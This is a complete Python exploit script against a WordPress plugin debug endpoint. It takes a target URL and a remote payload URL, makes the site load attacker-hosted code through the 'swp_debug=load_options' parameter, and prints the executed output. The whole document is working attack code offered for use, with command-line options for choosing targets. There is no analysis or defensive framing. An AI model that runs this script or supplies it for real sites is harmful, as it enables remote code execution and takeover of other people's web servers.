import sys
import requests
from urllib.parse import urljoin
import argparse

class Exploit:
    VULN_PATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"

    def __init__(self, target, payload_url):
        self.target = target
        self.payload_url = payload_url

    def engage(self):
        full_url = urljoin(self.target, self.VULN_PATH % self.payload_url)
        response = requests.get(full_url)

        if response.status_code == 500:
            print("[*] Received Response From Server!")
            content = response.text.split('<!DOCTYPE')[0]
            print("[<] Received:\n", content.strip())
        else:
            sys.exit("[~] Unexpected Status Received!")

def main():
    parser = argparse.ArgumentParser(description="Exploit WordPress RCE vulnerability.")
    parser.add_argument('-t', '--target', dest="target", required=True, help="Target Link")
    parser.add_argument('-p', '--payload-url', dest="payload_url", required=True, help="URL where the payload is hosted")

    args = parser.parse_args()

    print("[>] Sending Payload to System!")
    exploit = Exploit(args.target, args.payload_url)
    exploit.engage()

if __name__ == "__main__":
    main()